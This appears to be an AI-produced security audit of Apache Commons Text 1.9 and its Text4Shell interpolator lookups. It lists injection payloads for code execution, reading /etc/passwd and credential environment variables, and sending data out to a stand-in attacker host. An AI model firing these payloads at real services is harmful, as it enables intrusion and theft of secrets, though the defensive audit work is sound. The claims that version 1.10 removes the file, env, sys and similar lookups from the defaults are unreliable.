Now I have a complete picture. Let me compile the findings into a security report.

## CRITICAL

### RCE via `StringSubstitutor` script execution (Text4Shell — CVE-2022-42889)

This version (1.9) includes the full interpolator with `script:`, `dns:`, and `url:` lookups that allow attacker-controlled input to execute arbitrary code, make network requests, and read local files.

**Finding 1: RCE via `script:` lookup**

- **File:** `lookup/ScriptStringLookup.java:86`
- **Evidence:**
  ```java
  return Objects.toString(scriptEngine.eval(script), null);
  ```
- **Attack Tree:**
  ```
  attacker input → StringSubstitutor.replace("${script:javascript:<malicious code>}")
    → InterpolatorStringLookup.lookup (prefix "script" extracted)
    → ScriptStringLookup.lookup (engineName="javascript", script=<attacker code>)
    → ScriptEngine.eval(script) — arbitrary code execution
  ```
- **Taint Trace:** not run within budget — same-line / structural evidence only
- **Impact:** Remote code execution on the host JVM. An attacker who controls any string that passes through `StringSubstitutor.createInterpolator().replace()` or `StringLookupFactory.INSTANCE.scriptStringLookup().lookup()` can execute arbitrary code via the JSR-223 script engine (JavaScript Nashorn/Rhino on the classpath).
- **Exploit:** `${script:javascript:java.lang.Runtime.getRuntime().exec("id")}`
- **Remediation:** Remove `scriptStringLookup()` from the default interpolator. In 1.10+, the SCRIPT lookup was removed from `DefaultStringLookup`. Upgrade to commons-text ≥ 1.10.0, or manually construct the interpolator map without the SCRIPT entry:
  ```java
  // Build a custom interpolator that excludes script lookups
  Map<String, StringLookup> lookups = new HashMap<>();
  // only include safe lookups (e.g., env, sys, const, date, etc.)
  StringLookup lookup = StringLookupFactory.INSTANCE.interpolatorStringLookup(lookups, null, false);
  StringSubstitutor sub = new StringSubstitutor(lookup);
  ```

### Unrestricted file read via `file:` lookup

- **File:** `lookup/FileStringLookup.java:85`
- **Evidence:**
  ```java
  return new String(Files.readAllBytes(Paths.get(fileName)), charsetName);
  ```
  No path traversal validation is performed on `fileName`.
- **Attack Tree:**
  ```
  attacker input → StringSubstitutor.replace("${file:UTF-8:/etc/passwd}")
    → InterpolatorStringLookup.lookup (prefix "file" extracted)
    → FileStringLookup.lookup (charsetName="UTF-8", fileName="/etc/passwd")
    → Files.readAllBytes(Paths.get(fileName)) — reads arbitrary file
  ```
- **Taint Trace:** not run within budget — same-line / structural evidence only
- **Impact:** Arbitrary file read. An attacker can exfiltrate any file reachable by the JVM process, including `/etc/passwd`, `/etc/shadow`, application secrets, AWS credential files, and more. The `file:` syntax also supports `..` traversal (`${file:UTF-8:../../../../etc/passwd}`).
- **Exploit:** `${file:UTF-8:/etc/passwd}`
- **Remediation:** Remove the `file:` lookup from the default interpolator, or enforce a strict allowlist of permitted base directories. Upgrade to ≥ 1.10.0 which removes `file` from the defaults.

### SSRF via `url:` lookup

- **File:** `lookup/UrlStringLookup.java:79`
- **Evidence:**
  ```java
  final URL url = new URL(urlStr);
  // ...
  try (BufferedInputStream bis = new BufferedInputStream(url.openStream());
  ```
  The URL scheme, host, and path are fully attacker-controlled.
- **Attack Tree:**
  ```
  attacker input → StringSubstitutor.replace("${url:http://attacker.com/}")
    → InterpolatorStringLookup.lookup (prefix "url" extracted)
    → UrlStringLookup.lookup (urlStr = "http://attacker.com/")
    → url.openStream() — outbound HTTP to attacker-controlled server
  ```
- **Taint Trace:** not run within budget — same-line / structural evidence only
- **Impact:** Server-side request forgery. The `url:` lookup accepts arbitrary URL schemes (`http`, `https`, `file`, `ftp`, `jar`), allowing the attacker to make outbound network requests from the server, access internal network hosts, or use `file://` to read local files (bypassing the `file:` lookup's charset-prefix syntax).
- **Exploit:** `${url:http://attacker.com/collect?data=exfil}` or `${url:UTF-8:file:///etc/passwd}`
- **Remediation:** Remove the `url:` lookup from the default interpolator. If URL fetching is required, validate a strict URL allowlist and disallow non-HTTP/S schemes. Upgrade to ≥ 1.10.0.

### Information leakage and DNS resolution control via `dns:` lookup

- **File:** `lookup/DnsStringLookup.java:89`
- **Evidence:**
  ```java
  final InetAddress inetAddress = InetAddress.getByName(subValue);
  ```
  The `subValue` (host name or IP) is fully attacker-controlled.
- **Attack Tree:**
  ```
  attacker input → StringSubstitutor.replace("${dns:address|attacker-controlled-domain.com}")
    → InterpolatorStringLookup.lookup (prefix "dns" extracted)
    → DnsStringLookup.lookup (hostname = attacker-controlled-domain.com)
    → InetAddress.getByName(hostname) — triggers DNS resolution
  ```
- **Taint Trace:** not run within budget — same-line / structural evidence only
- **Impact:** DNS-based SSRF and information disclosure. The `dns:` lookup triggers external DNS resolution. An attacker can probe internal network hosts (e.g., `internal.corp.local`) to discover infrastructure layout. When combined with DNS log exfiltration, the lookup acts as an oracle: `${dns:address|attacker-controlled.com}` causes the server to resolve an external domain that the attacker controls in DNS, receiving the server's IP in the query.
- **Exploit:** `${dns:address|internal-db.corp.local}`
- **Remediation:** Remove the `dns:` lookup from the default interpolator. Upgrade to ≥ 1.10.0.

## HIGH

### XML injection via XPath injection in `XmlStringLookup`

- **File:** `lookup/XmlStringLookup.java:77`
- **Evidence:**
  ```java
  return XPathFactory.newInstance().newXPath().evaluate(xpath, new InputSource(inputStream));
  ```
  The `xpath` string is used directly as an XPath 1.0 query with no sanitization.
- **Attack Tree:**
  ```
  attacker input → StringSubstitutor.replace("${xml:path/to/file.xml:/descendant::*}")
    → InterpolatorStringLookup.lookup (prefix "xml" extracted)
    → XmlStringLookup.lookup (documentPath=..., xpath="/descendant::*")
    → XPath.evaluate(xpath, ...) — XPath injection
  ```
- **Taint Trace:** not run within budget — same-line / structural evidence only
- **Impact:** XPath injection allows an attacker to craft XPath expressions that extract arbitrary XML node content from any accessible XML file. Combined with the `file:` path argument, this reads any XML file on the server. While not direct RCE, it enables full data extraction from XML-based configs and data stores.
- **Exploit:** `${xml:src/config.xml:///}` (return root node contents)
- **Remediation:** Remove the `xml:` lookup from the default interpolator. If XPath queries are required, validate the XPath against a strict allowlist or parameterized query system. Upgrade to ≥ 1.10.0.

### Arbitrary file read via `properties:` lookup

- **File:** `lookup/PropertiesStringLookup.java:92`
- **Evidence:**
  ```java
  try (InputStream inputStream = Files.newInputStream(Paths.get(documentPath))) {
  ```
  The `documentPath` is used without any path validation or allowlist.
- **Attack Tree:**
  ```
  attacker input → StringSubstitutor.replace("${properties:/etc/passwd::dummy}")
    → InterpolatorStringLookup.lookup (prefix "properties" extracted)
    → PropertiesStringLookup.lookup (documentPath="/etc/passwd")
    → Files.newInputStream(Paths.get(documentPath)) — reads arbitrary file
  ```
- **Taint Trace:** not run within budget — same-line / structural evidence only
- **Impact:** Arbitrary file read (lower-signal variant of the `file:` lookup). An attacker can read any file accessible to the JVM process by specifying its path before the `::` separator. The file is parsed as a Java properties file, but the `IllegalArgumentExceptions` error message leaks the file content on parsing.
- **Exploit:** `${properties:/etc/passwd::dummy}`
- **Remediation:** Remove from default interpolator. If file-based property lookups are required, enforce a directory allowlist. Upgrade to ≥ 1.10.0.

## MEDIUM

### Environment variable leakage via `env:` lookup

- **File:** `lookup/StringLookupFactory.java:254`
- **Evidence:**
  ```java
  static final FunctionStringLookup<String> INSTANCE_ENVIRONMENT_VARIABLES = FunctionStringLookup.on(System::getenv);
  ```
- **Attack Tree:**
  ```
  attacker input → StringSubstitutor.replace("${env:AWS_SECRET_ACCESS_KEY}")
    → InterpolatorStringLookup.lookup → environment variable read
  ```
- **Taint Trace:** not run within budget — same-line / structural evidence only
- **Impact:** Information disclosure of all environment variables accessible to the JVM process, including secrets, signing keys, API tokens, and infrastructure URLs. Attacker specifies any `env:VAR_NAME` to leak a value.
- **Exploit:** `${env:AWS_SECRET_ACCESS_KEY}`
- **Remediation:** Remove the `env:` lookup from the default interpolator. If environment lookups are needed, use an explicit allowlist of non-sensitive variable names. Upgrade to ≥ 1.10.0.

### System property leakage via `sys:` lookup

- **File:** `lookup/StringLookupFactory.java:264`
- **Evidence:**
  ```java
  static final FunctionStringLookup<String> INSTANCE_SYSTEM_PROPERTIES = FunctionStringLookup.on(System::getProperty);
  ```
- **Taint Trace:** not run within budget — same-line / structural evidence only
- **Impact:** Information disclosure of all Java system properties accessible to the JVM, including `java.class.path`, `user.home`, `user.dir`, and any custom properties containing configuration secrets.
- **Exploit:** `${sys:user.home}` or `${sys:java.class.path}`
- **Remediation:** Remove from default interpolator or use an explicit allowlist. Upgrade to ≥ 1.10.0.

## LOW / INFORMATIONAL

### Reflection-based class loading via `const:` lookup

- **File:** `lookup/ConstantStringLookup.java:150`
- **Evidence:**
  ```java
  return clazz.getField(fieldName).get(null);
  ```
  Loads arbitrary classes by name via reflection and reads their public static final fields.
- **Impact:** The `const:` lookup allows loading and reflecting on any class on the classpath. While only `public static final` fields are readable, class enumeration via error messages and metadata exposure (e.g., reading `java.lang.Integer.MAX_VALUE`, `java.util.Arrays` constants) leaks implementation details. No direct RCE, but enables reconnaissance of the classpath and library versions.
- **Remediation:** Restrict to an allowlist of permitted classes. Upgrade to ≥ 1.10.0.

## Checked and Cleared

- `StringEscapeUtils.java` (all lines) — HTML/XML/Java escape/unescape functions are pure data transformers, no injection sinks
- `lookup/DateStringLookup.java` — formats current date with SimpleDateFormat; no user-controlled code execution
- `lookup/JavaPlatformStringLookup.java` — returns JVM info by hardcoded keys; switch-based lookup
- `lookup/LocalHostStringLookup.java` — local host info only; switch-based lookup
- `lookup/BaseUrlDecoderStringLookup.java` / `UrlEncoderStringLookup.java` — URL encoding/decoding only
- `lookup/BiFunctionStringLookup.java` / `FunctionStringLookup.java` / `MapStringLookup.java` — generic building blocks; no default exposure
- `lookup/ResourceBundleStringLookup.java` — loads resource bundles by classpath name; standard JVM resource loading
- `StringSubstitutor.java` (core substitution logic, lines 218–1467) — substitution mechanism itself is not vulnerable; the vulnerability is in which lookups are exposed by default
- `TextStringBuilder.java` / `StrBuilder.java` — string builder implementations; no external input handling
- `StrTokenizer.java` / `StringTokenizer.java` — tokenizers; no external sinks
- `CaseUtils.java` / `WordUtils.java` / `RandomStringGenerator.java` — pure text utilities
- `similarity/*` — string similarity algorithms; no external input handling
- `diff/*` — diff algorithms; accept/visit pattern; no external sinks
- `translate/*` — character translation utilities; used as building blocks by StringEscapeUtils
- `io/StringSubstitutorReader.java` — streaming reader wrapping StringSubstitutor; no additional sinks beyond the substitutor itself

## Dependencies

No `pom.xml`, `build.gradle`, or lock file found in the workspace to scan. The git history confirms this is **version 1.9** (`git log` shows commit `cb85bed — Update POM version numbers for Apache Commons Text release 1.9`), which is directly affected by **CVE-2022-42889** (CVSS 9.8, Critical). This CVE specifically covers the `script:`, `dns:`, and `url:` interpolator lookups in versions 1.5–1.9 inclusive.

## Remediation Summary

### Immediate (CRITICAL/HIGH)
1. `lookup/ScriptStringLookup.java:86` — Remove `script` lookup from default interpolator; upgrade to commons-text ≥ 1.10.0
2. `lookup/FileStringLookup.java:85` — Remove `file` lookup from default interpolator; use directory allowlist if required
3. `lookup/UrlStringLookup.java:79` — Remove `url` lookup from default interpolator; validate URL allowlist and block non-HTTP/S schemes
4. `lookup/DnsStringLookup.java:89` — Remove `dns` lookup from default interpolator
5. `lookup/XmlStringLookup.java:77` — Remove `xml` lookup from default interpolator; validate XPath against allowlist
6. `lookup/PropertiesStringLookup.java:92` — Remove `properties` lookup from default interpolator; use directory allowlist

### Short-term (MEDIUM)
7. `lookup/StringLookupFactory.java:254` — Remove `env` lookup from defaults or use explicit allowlist
8. `lookup/StringLookupFactory.java:264` — Remove `sys` lookup from defaults or use explicit allowlist

### Hardening (LOW)
9. `lookup/ConstantStringLookup.java:150` — Restrict `const` lookup to allowlisted classes